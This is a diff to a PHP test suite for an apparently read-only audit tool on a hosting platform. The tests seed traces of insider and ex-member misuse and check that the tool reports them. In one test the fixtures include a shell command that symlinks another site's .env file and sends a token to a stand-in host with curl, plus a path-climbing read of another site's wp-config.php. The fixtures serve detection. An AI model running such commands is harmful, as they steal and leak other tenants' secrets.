@@ -285,7 +285,9 @@ it('reads only: no write, no panel call, and a clean database says CLEAN or name
     expect($report['read_only'])->toBeTrue()
         ->and(collect($report['sources'])->pluck('verdict')->unique()->diff(['CLEAN', 'UNKNOWNS'])->all())->toBe([])
         ->and($report['summary']['hits'])->toBe(0)
-        ->and(flbSource($report, 'game_panel_identity')['verdict'])->toBe('UNKNOWNS'); // a panel user nobody recorded creating is not cleared
+        ->and(flbSource($report, 'game_panel_identity')['verdict'])->toBe('UNKNOWNS') // a panel user nobody recorded creating is not cleared
+        ->and(flbSource($report, 'aapanel_outside_root')['verdict'])->toBe('UNKNOWNS') // review round 1: a symlink lives on the node, never CLEAN while aaPanel sites exist
+        ->and($report['standing_state'])->toContain('before the first Phase 0 deploy'); // review round 1 (HIGH): the baseline rule travels with every report
 });
 
 it('refuses bad options with exit code 2', function () {
@@ -310,4 +312,162 @@ it('limits event rows to the window but keeps the evidence of any age that decid
     expect(flbSource($inside, 'staff_own_org')['hits'])->toHaveCount(1) // the membership came before the window and still counts
         ->and(flbSource($outside, 'staff_own_org')['hits'])->toHaveCount(0)
         ->and($outside['window']['since'])->toStartWith('2026-08-01');
+});
+
+// ── review round 1 (TASK-0038): the blind spots the reviewers found, each seeded as the trace it would leave ─────────
+
+it('still reports a past owner self-demotion after the ownership was later transferred away (TD-1, review round 1)', function () {
+    [$owner, $org] = $this->customerWithOrganization(['email' => 'byvaly@firma.test']);
+    $successor = flbUser('nastupce@firma.test');
+    $member = flbUser('clen@firma.test');
+    $at = CarbonImmutable::parse('2026-09-02 10:00:00');
+    // the owner accepts their own invitation as developer; a month later a legitimate transfer hands the organization on
+    DB::table('organization_invitations')->insert(['id' => 'inv_flb_past', 'organization_id' => $org->id, 'email' => 'byvaly@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'p'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
+    $selfAttach = flbAudit($at, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $owner->id, 'role' => 'developer'], 'organization', $org->id);
+    // the successor was an ordinary member before becoming the owner: that acceptance is not a demotion of anybody
+    DB::table('organization_invitations')->insert(['id' => 'inv_flb_successor', 'organization_id' => $org->id, 'email' => 'nastupce@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 's'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at->addDay(), 'created_at' => $at, 'updated_at' => $at]);
+    flbAudit($at->addDay(), $this->contextFor($successor, $org), 'organization.member.attach', ['user_id' => $successor->id, 'role' => 'developer'], 'organization', $org->id);
+    flbAudit($at->addDays(2), $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $member->id, 'role' => 'viewer'], 'organization', $org->id);
+    test()->travelTo($at->addMonth());
+    app(OrganizationService::class)->transferOwnership($org, $successor, $this->contextFor($owner, $org)); // attaches the successor as owner and the old owner as org_admin
+    test()->travelBack();
+
+    [$code, $report] = flbRun(['--source' => ['owner_demotion']]);
+    $source = flbSource($report, 'owner_demotion');
+
+    expect($code)->toBe(1)
+        ->and($source['hits'])->toHaveCount(1) // neither the successor's earlier acceptance nor the transfer's own org_admin attach is a hit
+        ->and($source['hits'][0])->toMatchArray(['kind' => 'owner_accepted_lower_role', 'organization_id' => $org->id, 'user_id' => $owner->id, 'invitation_id' => 'inv_flb_past', 'audit_event_id' => $selfAttach, 'owner_now' => false]);
+});
+
+it('reads Discord questions, action hooks and the gap a re-admission hides (G1, review round 1)', function () {
+    [$owner, $org] = $this->customerWithOrganization();
+    $gone = flbUser('pryc@firma.test');
+    $back = flbUser('zpet@firma.test');
+    $stays = flbUser('tady@firma.test');
+    $t0 = CarbonImmutable::parse('2026-09-04 09:00:00');
+    foreach ([$gone, $back, $stays] as $person) {
+        flbAudit($t0, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $person->id, 'role' => 'developer'], 'organization', $org->id);
+    }
+    $removedAt = $t0->addDays(2);
+    flbAudit($removedAt, $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $gone->id], 'organization', $org->id);
+    flbAudit($removedAt, $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $back->id], 'organization', $org->id);
+    flbAudit($removedAt->addDay(), $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $back->id, 'role' => 'developer'], 'organization', $org->id); // re-admitted
+    foreach ([$back, $stays] as $person) {
+        OrganizationMembership::query()->create(['organization_id' => $org->id, 'user_id' => $person->id, 'role_key' => 'developer', 'state' => 'active', 'joined_at' => $t0, 'created_at' => $t0, 'updated_at' => $t0]);
+    }
+    DB::table('discord_links')->insert([
+        // last_used_at is written before any authorization: a use, or a refused attempt
+        ['id' => 'dl_flb_pryc', 'organization_id' => $org->id, 'user_id' => $gone->id, 'discord_user_id' => '5151', 'discord_username' => 'eva', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addHours(6), 'commands' => 4, 'created_at' => $t0, 'updated_at' => $t0],
+        // removed and re-admitted while linked: last_used_at keeps only the latest use, after the re-admission
+        ['id' => 'dl_flb_zpet', 'organization_id' => $org->id, 'user_id' => $back->id, 'discord_user_id' => '5252', 'discord_username' => 'adam', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addDays(3), 'commands' => 9, 'created_at' => $t0, 'updated_at' => $t0],
+    ]);
+    // two `/onhost ask` questions after the removal: one also left its assistant.chat audit row (one hit, not two), one only its run
+    $run = fn (string $id, CarbonImmutable $when) => DB::table('support_ai_runs')->insert(['id' => $id, 'organization_id' => $org->id, 'user_id' => $gone->id, 'session_id' => 'discord:5151', 'provider' => 'rules', 'outcome' => 'answered', 'confident' => true, 'created_at' => $when, 'updated_at' => $when]);
+    $run('air_flb_audited', $removedAt->addHours(2));
+    $run('air_flb_silent', $removedAt->addHours(3));
+    $run('air_flb_before', $t0->addDay()); // while still a member
+    $discord = new CommandContext('user', $gone->id, $org->id, null, null, 'discord-bot', 'discord:5151', 'discord /onhost ask');
+    $chat = flbAudit($removedAt->addHours(2), $discord, 'assistant.chat', ['topic' => 'x', 'outcome' => 'answered', 'provider' => 'rules'], 'ai_run', 'air_flb_audited');
+    // an action hook runs as its creator: the removed member's hook ran; a staying member's hook ran after somebody left
+    $hookGone = flbAudit($removedAt->addHours(4), new CommandContext('user', $gone->id, $org->id, null, '10.0.0.9', 'action-hook', 'hook:ah_flb_pryc', 'action hook deploy'), 'integration.hook.trigger', ['action' => 'deploy.run', 'operation_id' => 'op_h1'], 'action_hook', 'ah_flb_pryc');
+    flbAudit($removedAt->addHours(5), new CommandContext('user', $stays->id, $org->id, null, '10.0.0.9', 'action-hook', 'hook:ah_flb_tady', 'action hook backup'), 'integration.hook.trigger', ['action' => 'backup', 'operation_id' => 'op_h2'], 'action_hook', 'ah_flb_tady');
+    DB::table('action_hooks')->insert(['id' => 'ah_flb_pryc', 'organization_id' => $org->id, 'service_id' => 'svc_flb_h', 'created_by' => $gone->id, 'name' => 'deploy', 'action' => 'deploy.run', 'params' => '[]', 'token_hash' => hash('sha256', 'h'), 'enabled' => true, 'created_at' => $t0, 'updated_at' => $t0]);
+
+    [$code, $report] = flbRun(['--source' => ['discord_after_removal']]);
+    $source = flbSource($report, 'discord_after_removal');
+    $byKind = collect($source['hits'])->groupBy('kind');
+
+    expect($code)->toBe(1)
+        ->and($byKind->keys()->all())->toEqualCanonicalizing(['discord_used_after_removal', 'discord_command_after_removal', 'discord_ask_after_removal', 'hook_run_after_removal'])
+        ->and($byKind['discord_used_after_removal'])->toHaveCount(1)
+        ->and($byKind['discord_used_after_removal'][0])->toMatchArray(['link_id' => 'dl_flb_pryc', 'confidence' => 'use_or_attempt'])
+        ->and($byKind['discord_command_after_removal'])->toHaveCount(1)
+        ->and($byKind['discord_command_after_removal'][0])->toMatchArray(['audit_event_id' => $chat])
+        ->and($byKind['discord_ask_after_removal'])->toHaveCount(1)
+        ->and($byKind['discord_ask_after_removal'][0])->toMatchArray(['ai_run_id' => 'air_flb_silent', 'user_id' => $gone->id, 'organization_id' => $org->id])
+        ->and($byKind['hook_run_after_removal'][0])->toMatchArray(['audit_event_id' => $hookGone, 'hook_id' => 'ah_flb_pryc', 'user_id' => $gone->id])
+        ->and($source['checked'])->toHaveKey('support_ai_runs')
+        ->and(implode(' ', $source['unknowns']))->toContain('dl_flb_zpet')->toContain('1 action hook run')
+        ->and(implode(' ', $source['notes']))->toContain('ah_flb_pryc');
+});
+
+it('reads command.run for paths and symlinks outside the root and never clears aaPanel (PA-02, review round 1)', function () {
+    [, $org] = $this->customerWithOrganization();
+    $site = featureWebService($org, 'aapanel'); // root /www/wwwroot/shop.cz
+    $at = CarbonImmutable::parse('2026-09-05 12:00:00');
+    $link = flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'ln -s /www/wwwroot/other.cz/.env leak.txt && curl -s https://example.test/?token=TOPSECRET', 'cwd' => '', 'timeout' => 60], [], $at);
+    $climb = flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'cat ../other.cz/wp-config.php', 'cwd' => 'public', 'timeout' => 60], [], $at->addMinute(), Operation::FAILED);
+    flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'php artisan cache:clear', 'cwd' => 'app', 'timeout' => 60], [], $at->addMinutes(2));
+
+    [$code, $report] = flbRun(['--source' => ['aapanel_outside_root']]);
+    $source = flbSource($report, 'aapanel_outside_root');
+    $byOperation = collect($source['hits'])->keyBy('operation_id');
+
+    expect($code)->toBe(1)
+        ->and($source['hits'])->toHaveCount(2)
+        ->and($byOperation[$link->id])->toMatchArray(['kind' => 'command_reaches_outside_root', 'confidence' => 'possible', 'action' => 'command.run', 'symlink' => true])
+        ->and($byOperation[$link->id]['paths'])->toContain('/www/wwwroot/other.cz/.env')
+        ->and($byOperation[$climb->id])->toMatchArray(['kind' => 'command_reaches_outside_root', 'climbs' => true, 'state' => 'FAILED'])
+        ->and(implode(' ', $source['unknowns']))->toContain('operator:aapanel:tenancy')->toContain($site->id);
+    expect(json_encode($report))->not->toContain('TOPSECRET');
+});
+
+it('reports the IBAN of a rejected request and a first payout it cannot compare (P2, review round 1)', function () {
+    [, $partnerOrg] = $this->customerWithOrganization();
+    $insider = flbUser('ucetni2@partner.test');
+    DB::table('partners')->insert(['id' => 'ptn_flb2', 'organization_id' => $partnerOrg->id, 'code' => 'FLB2', 'model' => 'share', 'tier' => 'bronze', 'rate_pct' => 15, 'currency' => 'CZK', 'iban' => 'CZ5503000000000123456789', 'state' => 'active', 'created_at' => now(), 'updated_at' => now()]);
+    $at = CarbonImmutable::parse('2026-07-01 10:00:00');
+    $payout = function (string $id, string $number, string $iban, string $state, CarbonImmutable $when) {
+        DB::table('partner_payouts')->insert(['id' => $id, 'partner_id' => 'ptn_flb2', 'number' => $number, 'amount_minor' => 100000, 'currency' => 'CZK', 'method' => 'bank_transfer', 'iban' => $iban, 'state' => $state, 'self_billing' => '[]', 'requested_at' => $when, 'paid_at' => $state === 'paid' ? $when->addDay() : null, 'created_at' => $when, 'updated_at' => $when]);
+    };
+    $payout('ppo_flb2_first', 'PO-2026-07', 'CZ6508000000192000145399', 'paid', $at);                           // nothing earlier to compare with
+    $payout('ppo_flb2_rejected', 'PO-2026-08', 'CZ5503000000000123456789', 'rejected', $at->addMonth());         // rejected, yet partners.iban kept it
+    $payout('ppo_flb2_auto', 'PO-2026-09', 'CZ5503000000000123456789', 'requested', $at->addMonths(2));         // the automatic payout followed it
+    foreach (['ppo_flb2_first' => 'paid', 'ppo_flb2_auto' => 'allocated'] as $payoutId => $state) { // fully covered: no amount hit
+        DB::table('partner_commissions')->insert(['id' => 'pcm_'.$payoutId, 'partner_id' => 'ptn_flb2', 'organization_id' => $partnerOrg->id, 'period' => '2026-07', 'kind' => 'share', 'base_minor' => 700000, 'rate_pct' => 15, 'amount_minor' => 100000, 'currency' => 'CZK', 'state' => $state, 'payout_id' => $payoutId, 'created_at' => now(), 'updated_at' => now()]);
+    }
+    flbAudit($at->addMonth(), $this->contextFor($insider, $partnerOrg), 'partner.payout.request', ['number' => 'PO-2026-08'], 'partner_payout', 'ppo_flb2_rejected');
+
+    [$code, $report] = flbRun(['--source' => ['partner_payouts']]);
+    $source = flbSource($report, 'partner_payouts');
+    $byPayout = collect($source['hits'])->keyBy('payout_id');
+
+    expect($code)->toBe(1)
+        ->and($source['hits'])->toHaveCount(2) // a rejected payout is never an amount hit: its commissions went back
+        ->and($byPayout['ppo_flb2_rejected'])->toMatchArray(['kind' => 'payout_iban_changed', 'state' => 'rejected', 'requested_by' => $insider->id, 'requested_by_owner' => false])
+        ->and($byPayout['ppo_flb2_auto'])->toMatchArray(['kind' => 'payout_iban_changed', 'state' => 'requested'])
+        ->and(implode(' ', $source['unknowns']))->toContain('ppo_flb2_first');
+});
+
+it('reads the staff self-grant and reinstatement shortcuts and counts memberships it cannot judge (IF-8, review round 1)', function () {
+    [$owner, $own] = $this->customerWithOrganization();
+    $staff = $this->staff();
+    $at = CarbonImmutable::parse('2026-09-07 15:00:00');
+    test()->travelTo($at->subDay());
+    app(OrganizationService::class)->attachMember($own, $staff, 'viewer', $this->contextFor($owner, $own), joinedNow: true);
+    test()->travelBack();
+    $mine = featureWebService($own, 'ispconfig');
+    // mayGrant lets staff past self_membership_locked and role_above_own: the attach row names the actor as its own target
+    $grant = flbAudit($at, $this->contextFor($staff, $own), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'org_admin'], 'organization', $own->id);
+    // ServiceReinstatement::actorMay answers true for any staff user: a reinstatement asked in their own organization
+    $reinstate = flbAudit($at->addHour(), $this->contextFor($staff, $own), 'service.reinstate.requested', ['total_due' => ['minor' => 100, 'currency' => 'CZK']], 'service', $mine->id);
+    // a staff user who accepted an invitation in another organization attached themselves too: that is not a self-grant
+    [$otherOwner, $invited] = $this->customerWithOrganization();
+    DB::table('organization_invitations')->insert(['id' => 'inv_flb_staff', 'organization_id' => $invited->id, 'email' => mb_strtolower((string) $staff->email), 'role_key' => 'developer', 'token_hash' => hash('sha256', 'st'), 'invited_by' => $otherOwner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
+    flbAudit($at, $this->contextFor($staff, $invited), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'developer'], 'organization', $invited->id);
+    // an organization older than the audit: whether the staff user was a member of it when lifting the hold cannot be told
+    [, $ancient] = $this->customerWithOrganization();
+    Organization::query()->whereKey($ancient->id)->update(['created_at' => '2020-01-01 00:00:00']);
+    flbAudit($at, $this->contextFor($staff, $ancient), 'service.hold.lift', ['lifted' => ['abuse'], 'reason' => 'x'], 'service', 'svc_flb_old');
+
+    [$code, $report] = flbRun(['--source' => ['staff_own_org']]);
+    $source = flbSource($report, 'staff_own_org');
+    $kinds = collect($source['hits'])->keyBy('kind');
+
+    expect($code)->toBe(1)
+        ->and($source['hits'])->toHaveCount(2)
+        ->and($kinds['staff_self_grant'])->toMatchArray(['audit_event_id' => $grant, 'user_id' => $staff->id, 'organization_id' => $own->id, 'role' => 'org_admin', 'member_before' => true])
+        ->and($kinds['staff_reinstate_own_org'])->toMatchArray(['audit_event_id' => $reinstate, 'user_id' => $staff->id, 'organization_id' => $own->id, 'service_id' => $mine->id])
+        ->and(implode(' ', $source['unknowns']))->toContain('1 staff action');
 });
